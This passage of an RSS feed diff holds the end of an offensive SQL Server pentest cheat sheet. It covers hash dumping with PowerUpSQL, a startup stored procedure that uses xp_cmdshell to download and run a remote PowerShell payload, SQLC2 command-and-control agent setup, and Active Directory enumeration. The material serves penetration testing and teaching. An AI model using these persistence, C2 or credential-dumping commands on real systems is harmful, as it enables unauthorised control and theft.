+&lt;h2 id="persistence">Persistence&lt;/h2>
+&lt;h3 id="sql-login-pw-hash-dumping">SQL Login PW Hash Dumping&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Returns logins from target SQL Servers&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLServerPasswordHash&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">ft &lt;/span>&lt;span class="n">-AutoSize&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="startup-stored-procedures">Startup Stored Procedures&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- HeidiSQL
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">-- Create a stored procedure (assuming xp_cmdshell is already enabled)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="n">USE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">master&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">GO&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">CREATE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">PROCEDURE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sp_autops&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">EXEC&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">master&lt;/span>&lt;span class="p">..&lt;/span>&lt;span class="n">xp_cmdshell&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;powershell -C &amp;#34;iex (new-object System.Net.WebClient).DownloadString(&amp;#39;&amp;#39;http://webserver/payload.ps1&amp;#39;&amp;#39;)&amp;#34;&amp;#39;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">GO&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- Mark the stored procedure for automatic execution
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">EXEC&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sp_procoption&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="n">ProcName&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;sp_autops&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="n">OptionName&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;startup&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="n">OptionValue&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;on&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">-- To list stored procedures marked for automatic execution
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sysobjects&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">WHERE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">type&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;P&amp;#39;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AND&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">OBJECTPROPERTY&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;ExecIsStartUp&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Reference:&lt;/p>
+&lt;ul>
+&lt;li>&lt;a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-procoption-transact-sql" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-procoption-transact-sql&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/" target="_blank" rel="noopener">https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h3 id="triggers">Triggers&lt;/h3>
+&lt;p>A trigger is a special kind of stored procedure that automatically executes when an event occurs in the SQL Server.&lt;/p>
+&lt;p>Reference: &lt;a href="https://docs.microsoft.com/en-us/sql/t-sql/statements/create-trigger-transact-sql" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/sql/t-sql/statements/create-trigger-transact-sql&lt;/a>&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>DDL triggers:&lt;/p>
+&lt;p>Reference:&lt;/p>
+&lt;ul>
+&lt;li>&lt;a href="https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/" target="_blank" rel="noopener">https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://docs.microsoft.com/en-us/sql/relational-databases/triggers/implement-ddl-triggers" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/sql/relational-databases/triggers/implement-ddl-triggers&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://docs.microsoft.com/en-us/sql/relational-databases/triggers/ddl-event-groups" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/sql/relational-databases/triggers/ddl-event-groups&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>DML triggers:&lt;/p>
+&lt;p>Reference:&lt;/p>
+&lt;ul>
+&lt;li>&lt;a href="https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/" target="_blank" rel="noopener">https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://docs.microsoft.com/en-us/sql/relational-databases/triggers/create-dml-triggers" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/sql/relational-databases/triggers/create-dml-triggers&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>Logon triggers:&lt;/p>
+&lt;p>Reference:&lt;/p>
+&lt;ul>
+&lt;li>&lt;a href="https://docs.microsoft.com/en-us/sql/relational-databases/triggers/logon-triggers" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/sql/relational-databases/triggers/logon-triggers&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="registry">Registry&lt;/h3>
+&lt;p>References:&lt;/p>
+&lt;ul>
+&lt;li>&lt;a href="https://support.microsoft.com/en-us/help/887165/bug-you-may-receive-an-access-isdenied-error-message-when-a-query-cal" target="_blank" rel="noopener">https://support.microsoft.com/en-us/help/887165/bug-you-may-receive-an-access-isdenied-error-message-when-a-query-cal&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://blog.netspi.com/get-windows-auto-login-passwords-via-sql-server-powerupsql/" target="_blank" rel="noopener">https://blog.netspi.com/get-windows-auto-login-passwords-via-sql-server-powerupsql/&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h3 id="sqlc2">SQLC2&lt;/h3>
+&lt;p>This is a csharp assembly; can be imported into SQL Server and used for basic post exploitation.&lt;/p>
+&lt;h4 id="sqlc2--installing-server">SQLC2 – Installing Server&lt;/h4>
+&lt;p>This functions creates the C2 SQL Server tables in the target database. If the database does not exist, the script will try to create it.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># SQLC2&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Install-SQLC2Server&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s1">&amp;#39;CloudAdmin&amp;#39;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s1">&amp;#39;CloudPassword!&amp;#39;&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s1">&amp;#39;cloudserver1.database.windows.net&amp;#39;&lt;/span> &lt;span class="n">-Database&lt;/span> &lt;span class="s1">&amp;#39;database1&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="sqlc2--installing-psagent">SQLC2 – Installing PsAgent&lt;/h4>
+&lt;p>This functions installs a C2 Agent on the target SQL Server by creating a server link to the C2 SQL Server, then it creates a TSQL SQL Agent job that uses the link to download commands from the C2 server and executes them. By default is execute OS command using xp_cmdshell. This requires sysadmin privileges on the target server.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># SQLC2&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Install-SQLC2AgentPs&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s1">&amp;#39;SQLServer1&amp;#39;&lt;/span> &lt;span class="n">-Database&lt;/span> &lt;span class="s1">&amp;#39;test1&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="sqlc2--command--control">SQLC2 – Command &amp;amp; Control&lt;/h4>
+&lt;p>View SQLC2 Agents:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># SQLC2&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLC2Agent&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s1">&amp;#39;CloudAdmin&amp;#39;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s1">&amp;#39;CloudPassword!&amp;#39;&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s1">&amp;#39;cloudserver1.database.windows.net&amp;#39;&lt;/span> &lt;span class="n">-Database&lt;/span> &lt;span class="s1">&amp;#39;database1&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Set command to run on agent:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># SQLC2&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-SQLC2Command&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s1">&amp;#39;CloudAdmin&amp;#39;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s1">&amp;#39;CloudPassword!&amp;#39;&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s1">&amp;#39;cloudserver1.database.windows.net&amp;#39;&lt;/span> &lt;span class="n">-Database&lt;/span> &lt;span class="s1">&amp;#39;database1&amp;#39;&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s2">&amp;#34;Whoami&amp;#34;&lt;/span> &lt;span class="n">-ServerName&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get command results:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># SQLC2&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-SQLC2Command&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s1">&amp;#39;CloudAdmin&amp;#39;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s1">&amp;#39;CloudPassword!&amp;#39;&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s1">&amp;#39;cloudserver1.database.windows.net&amp;#39;&lt;/span> &lt;span class="n">-Database&lt;/span> &lt;span class="s1">&amp;#39;database1&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="active-directory-enumeration">Active Directory Enumeration&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerUpSQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides the domain account policy for the SQL Server&amp;#39;s domain.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainAccountPolicy&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainAccountPolicy&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainAccountPolicy&lt;/span> &lt;span class="n">-Instance&lt;/span> &lt;span class="s2">&amp;#34;SQLServer1\Instance1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-LinkUsername&lt;/span> &lt;span class="s2">&amp;#34;domain\user&amp;#34;&lt;/span> &lt;span class="n">-LinkPassword&lt;/span> &lt;span class="s2">&amp;#34;Password123!&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceLocal&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLDomainAccountPolicy&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLInstanceRemote&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-SQLDomainAccountPolicy&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of the domain computers on the SQL Server&amp;#39;s domain.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainComputer&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of the domain controllers on the SQL Server&amp;#39;s domain.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainController&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of the potential exploitable computers on the SQL Server&amp;#39;s domain based on Operating System version information.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainExploitableSystem&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of the domain groups on the SQL Server&amp;#39;s domain.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainGroup&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of the domain group members on the SQL Server&amp;#39;s domain.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainGroupMember&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Can be used to execute arbitrary LDAP queries on the SQL Server&amp;#39;s domain.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainObject&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of the organization units on the SQL Server&amp;#39;s domain.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainOu&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of the local administrator password on the SQL Server&amp;#39;s domain. This typically required Domain Admin privileges.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainPasswordsLAPS&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of sites.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainSite&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of subnets.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainSubnet&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of domain trusts.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainTrust&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of the domain users on the SQL Server&amp;#39;s domain.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainUser&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of the disabled domain users on the SQL Server&amp;#39;s domain.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainUser&lt;/span> &lt;span class="n">-UserState&lt;/span> &lt;span class="n">Disabled&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of the enabled domain users on the SQL Server&amp;#39;s domain.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainUser&lt;/span> &lt;span class="n">-UserState&lt;/span> &lt;span class="n">Enabled&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of the locked domain users on the SQL Server&amp;#39;s domain.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainUser&lt;/span> &lt;span class="n">-UserState&lt;/span> &lt;span class="n">Locked&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of the domain users that do not require Kerberos preauthentication on the SQL Server&amp;#39;s domain.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainUser&lt;/span> &lt;span class="n">-UserState&lt;/span> &lt;span class="n">PreAuthNotRequired&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># This parameter can be used to list users that have not change their password in the last 90 days. Any number can be provided though.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainUser&lt;/span> &lt;span class="n">-UserState&lt;/span> &lt;span class="n">PwLastSet&lt;/span> &lt;span class="mf">90&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of the domain users that never expire on the SQL Server&amp;#39;s domain.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainUser&lt;/span> &lt;span class="n">-UserState&lt;/span> &lt;span class="n">PwNeverExpires&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of the domain users with the PASSWD_NOTREQD flag set on the SQL Server&amp;#39;s domain.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainUser&lt;/span> &lt;span class="n">-UserState&lt;/span> &lt;span class="n">PwNotRequired&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of the domain users storing their password using reversible encryption on the SQL Server&amp;#39;s domain.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainUser&lt;/span> &lt;span class="n">-UserState&lt;/span> &lt;span class="n">PwStoredRevEnc&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of the domain users that require smart card for interactive login on the SQL Server&amp;#39;s domain.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainUser&lt;/span> &lt;span class="n">-UserState&lt;/span> &lt;span class="n">SmartCardRequired&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of the domain users trusted for delegation on the SQL Server&amp;#39;s domain.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainUser&lt;/span> &lt;span class="n">-UserState&lt;/span> &lt;span class="n">TrustedForDelegation&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Provides a list of the domain users trusted to authenticate for delegation on the SQL Server&amp;#39;s domain.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-SQLDomainUser&lt;/span> &lt;span class="n">-UserState&lt;/span> &lt;span class="n">TrustedToAuthForDelegation&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="tools">Tools&lt;/h2>
+&lt;ul>
+&lt;li>&lt;a href="https://github.com/netspi/PowerUpSQL" target="_blank" rel="noopener">PowerUpSQL&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/NetSPI/SQLC2" target="_blank" rel="noopener">SQLC2&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/NetSPI/Powershell-Modules" target="_blank" rel="noopener">NetSPI Powershell-Modules&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.heidisql.com/" target="_blank" rel="noopener">HeidiSQL&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">Nishang&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h1 id="references">References&lt;/h1>
+&lt;ul>
+&lt;li>&lt;a href="https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet" target="_blank" rel="noopener">PowerUpSQL Cheatsheet&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://blog.netspi.com/blindly-discover-sql-server-instances-powerupsql/" target="_blank" rel="noopener">Blindly discover SQL Server instances - PowerUpSQL&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domainaccounts/" target="_blank" rel="noopener">Enumerating domain accounts - PowerUpSQL&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-databaserole-members-transact-sql" target="_blank" rel="noopener">SQL database role members&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://docs.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql" target="_blank" rel="noopener">EXECUTE AS&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/" target="_blank" rel="noopener">Hacking SQL Server stored procedures for user impersonation&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://docs.microsoft.com/en-us/sql/relational-databases/security/trustworthy-database-property" target="_blank" rel="noopener">Trustworthy database - 1&lt;/a>&lt;/li>
+&lt;li>&lt;a href="http://sqlity.net/en/1653/the-trustworthy-database-property-explained-part-1/" target="_blank" rel="noopener">Trustworthy database - 2&lt;/a>&lt;/li>
+&lt;li>&lt;a href="http://www.sqlservercentral.com/articles/Security/121178/" target="_blank" rel="noopener">Trustworthy database - 3&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.slideshare.net/nullbind/beyond-xpcmdshell-owning-the-empire-throughsql-server" target="_blank" rel="noopener">XP_CMDSHELL&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/NetSPI/PowerUpSQL/wiki/Active-Directory-Recon-Functions" target="_blank" rel="noopener">Active Directory Recon functions&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-serversdatabase-engine" target="_blank" rel="noopener">SQL Linked Servers&lt;/a>&lt;/li>
+&lt;li>&lt;a href="http://www.labofapenetrationtester.com/2017/03/using-sql-server-for-attacking-forest-trust.html" target="_blank" rel="noopener">Using SQL Server for attacking forest trusts&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://blog.netspi.com/decrypting-mssql-database-link-server-passwords/" target="_blank" rel="noopener">Decrypting database link server passwords&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;hr></description></item></channel></rss>
